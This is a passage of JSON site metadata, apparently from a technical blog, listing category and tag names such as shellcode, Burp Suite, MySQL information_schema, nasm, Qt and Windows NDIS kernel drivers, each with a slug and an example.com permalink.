Pattern","slug":"System-Architecture/Plugin-Pattern","permalink":"http://example.com/categories/System-Architecture/Plugin-Pattern/"},{"name":"shellcode","slug":"Penetration-Test/shellcode","permalink":"http://example.com/categories/Penetration-Test/shellcode/"},{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"command","slug":"linux/command","permalink":"http://example.com/categories/linux/command/"},{"name":"Asm","slug":"Asm","permalink":"http://example.com/categories/Asm/"},{"name":"linux","slug":"Asm/linux","permalink":"http://example.com/categories/Asm/linux/"},{"name":"hash","slug":"Penetration-Test/hash","permalink":"http://example.com/categories/Penetration-Test/hash/"},{"name":"About information_schema","slug":"Penetration-Test/MySQL/About-information-schema","permalink":"http://example.com/categories/Penetration-Test/MySQL/About-information-schema/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/categories/C-C/"},{"name":"Qt","slug":"C-C/Qt","permalink":"http://example.com/categories/C-C/Qt/"},{"name":"Others","slug":"Others","permalink":"http://example.com/categories/Others/"},{"name":"float data","slug":"Others/float-data","permalink":"http://example.com/categories/Others/float-data/"},{"name":"windows","slug":"Asm/windows","permalink":"http://example.com/categories/Asm/windows/"},{"name":"Kernel","slug":"Kernel","permalink":"http://example.com/categories/Kernel/"},{"name":"windows","slug":"Kernel/windows","permalink":"http://example.com/categories/Kernel/windows/"},{"name":"ndis6","slug":"Kernel/windows/ndis6","permalink":"http://example.com/categories/Kernel/windows/ndis6/"}],"tags":[{"name":"Burp Suite","slug":"Burp-Suite","permalink":"http://example.com/tags/Burp-Suite/"},{"name":"user enumeration vulnerability","slug":"user-enumeration-vulnerability","permalink":"http://example.com/tags/user-enumeration-vulnerability/"},{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"shellcode","slug":"shellcode","permalink":"http://example.com/tags/shellcode/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"command","slug":"command","permalink":"http://example.com/tags/command/"},{"name":"nasm","slug":"nasm","permalink":"http://example.com/tags/nasm/"},{"name":"hash","slug":"hash","permalink":"http://example.com/tags/hash/"},{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"asm","slug":"asm","permalink":"http://example.com/tags/asm/"},{"name":"float","slug":"float","permalink":"http://example.com/tags/float/"},{"name":"binary","slug":"binary","permalink":"http://example.com/tags/binary/"},{"name":"inline","slug":"inline","permalink":"http://example.com/tags/inline/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/tags/C-C/"},{"name":"kernel","slug":"kernel","permalink":"http://example.com/tags/kernel/"},{"name":"ndis6","slug":"ndis6","permalink":"http://example.com/tags/ndis6/"},{"name":"firewall","slug":"firewall","permalink":"http://example.com/tags/firewall/"},{"name":"windows xp","slug":"windows-xp","permalink":"http://example.com/tags/windows-xp/"}]}